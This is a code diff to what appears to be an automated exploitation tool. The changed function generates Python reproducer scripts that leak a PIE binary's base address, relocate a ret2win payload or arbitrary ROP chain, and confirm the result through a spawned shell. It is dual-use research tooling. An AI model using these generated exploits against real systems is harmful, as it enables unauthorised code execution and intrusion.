@@ -203,22 +203,28 @@ def leak_and_exploit(exe, base_argv, *, leak_regex: str, leak_base_offset=None,
             observe.absorbed(_log, "continuing")
 
 
-def render_pie_ret2win_script(*, leak_regex, win_off, offset, leak_trigger, named_leak_off=None,
-                              anchors=None, pre=b"", suf=b"", loop_feed=b"", shell=True,
-                              success_regex=None) -> bytes:
-    """Self-contained reproducer for a PIE ret2win defeated by a runtime info-leak. A PIE payload
-    is base-specific, so no static input can exist: the script sends the confirmed `leak_trigger`,
-    reads the leaked pointer(s), recovers the image base, and sends the framed ret2win payload --
-    exactly as `_pie_leak_exploit` confirmed. It used to ship this only when the analyst named the
-    leaked symbol; in AUTO mode the bundle carried a static 4 KB input that could never re-hijack a
-    freshly randomized base.
+def render_pie_leak_script(*, leak_regex, offset, leak_trigger, win_off=0, segments=None,
+                           named_leak_off=None, anchors=None, pre=b"", suf=b"", loop_feed=b"",
+                           shell=True, success_regex=None) -> bytes:
+    """Self-contained reproducer for a PIE L3 defeated by a runtime info-leak. A PIE payload is
+    base-specific, so no static input can exist: the script sends the confirmed `leak_trigger`,
+    reads the leaked pointer(s), recovers the image base, relocates the payload and sends it --
+    exactly as `_pie_leak_exploit` confirmed. (Auto mode used to ship a static payload that could
+    never re-hijack a freshly randomized base.)
 
-    Base recovery mirrors the live path: subtract `named_leak_off` when a symbol was named, else
-    corroborate across the baked `anchors` (>=2 leaked slots, like `exploit.recover_pie_base`).
-    `pre`/`suf` are L2's framing around the payload; `loop_feed` satisfies a re-entry read. Grades
-    by a nonce challenge a spawned shell evaluates (`shell`), or an analyst `success_regex`."""
+    The payload is either a plain ret2win (`win_off`: `cyclic(offset) + base+win_off`) or an
+    arbitrary `segments` template -- a list of `["const", hex]` / `["rel", off]` pieces, where a
+    `rel` piece renders as an 8-byte `base + off` -- which carries any relocated ROP chain
+    (mprotect+shellcode, ret2plt, ...) with no per-exploit script. Base recovery mirrors the live
+    path: subtract `named_leak_off` when a symbol was named, else corroborate across the baked
+    `anchors` (>=2 leaked slots, like `exploit.recover_pie_base`). `pre`/`suf` are L2's framing;
+    `loop_feed` satisfies a re-entry read. Grades by a nonce challenge a spawned shell evaluates
+    (`shell`), or an analyst `success_regex`."""
     grade = ("ok = (b'LYKOS_SHELL_%d' % (a*b)) in out"
              if shell else f"ok = re.search({success_regex!r}.encode(), out) is not None")
+    build_payload = ("b''.join(x[1] if x[0]=='const' else q(base+x[1]) for x in SEGMENTS)"
+                     if segments is not None else "cyclic(OFF) + q(base + WIN_OFF)")
+    seg_literal = [[k, (v.hex() if k == "const" else int(v))] for k, v in (segments or [])]
     return (
         "#!/usr/bin/env python3\n"
         "# Lykos L3 reproducer: PIE ret2win via a runtime info-leak. Authorized use only.\n"
@@ -229,6 +235,8 @@ def render_pie_ret2win_script(*, leak_regex, win_off, offset, leak_trigger, name
         f"OFF={offset}; WIN_OFF={win_off:#x}; RX={leak_regex!r}\n"
         f"NAMED_OFF={named_leak_off if named_leak_off is None else hex(named_leak_off)}\n"
         f"ANCHORS={anchors if anchors is not None else '{}'!r}\n"
+        f"RAW_SEGMENTS={seg_literal!r}\n"
+        "SEGMENTS=[(k, bytes.fromhex(v)) if k=='const' else (k, v) for k, v in RAW_SEGMENTS]\n"
         f"TRIG={bytes(leak_trigger or b'')!r}; PRE={bytes(pre)!r}; SUF={bytes(suf)!r}; "
         f"FEED={bytes(loop_feed or b'')!r}\n"
         "def read_until(p, deadline, quiet=0.3):\n"
@@ -268,8 +276,8 @@ def render_pie_ret2win_script(*, leak_regex, win_off, offset, leak_trigger, name
         "                vals.append(int.from_bytes(buf[i:i+8], 'little'))\n"
         "    base = recover(vals)\n"
         "    if not base: p.kill(); continue\n"
-        "    print('leaked base %#x -> win %#x' % (base, base + WIN_OFF))\n"
-        "    payload = PRE + cyclic(OFF) + q(base + WIN_OFF) + SUF\n"
+        "    print('leaked image base %#x' % base)\n"
+        f"    payload = PRE + ({build_payload}) + SUF\n"
         "    a, b = random.randint(1000, 9999), random.randint(1000, 9999)\n"
         # A write may BrokenPipe when the win exits (a flag-printer _exit()s; only a shell keeps
         # reading) -- tolerate it and still read+grade what came back, don't abandon the attempt.
@@ -282,10 +290,15 @@ def render_pie_ret2win_script(*, leak_regex, win_off, offset, leak_trigger, name
         f"    {grade}\n"
         "    if ok:\n"
         "        sys.stdout.write(out.decode('latin-1', 'ignore'))\n"
-        "        print('\\n[+] PIE base recovered, control hijacked to win -- reproduced'); sys.exit(0)\n"
+        "        print('\\n[+] PIE base recovered, relocated payload reached its target -- reproduced'); sys.exit(0)\n"
         "    p.kill()\n"
-        "print('[-] PIE ret2win did not confirm'); sys.exit(1)\n"
+        "print('[-] PIE exploit did not confirm'); sys.exit(1)\n"
     ).encode()
+
+
+# Back-compat alias: the ret2win filer calls this name; the generalised body handles both.
+def render_pie_ret2win_script(**kw) -> bytes:
+    return render_pie_leak_script(**kw)
 
 
 def render_canary_script(*, canary_offset, ret_offset, canary_trigger, pop_rdi, puts_plt, puts_got,
